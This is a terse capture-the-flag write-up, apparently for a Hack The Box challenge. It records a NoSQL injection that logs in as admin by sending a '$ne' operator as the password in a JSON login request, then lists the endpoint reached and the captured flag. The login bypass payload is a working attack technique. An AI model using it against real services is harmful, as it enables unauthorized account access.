'''
NOSQL injectioin

https://book.hacktricks.xyz/pentesting-web/nosql-injection

Post Man
POST http://94.237.51.159:51784/api/login
Body
{
    "username":"admin",
    "password":{
        "$ne":"asdf"
    }
}

http://94.237.51.159:51784/api/votes/list
HTB{c0rrupt3d_c0uch_b4ll0t}
'''
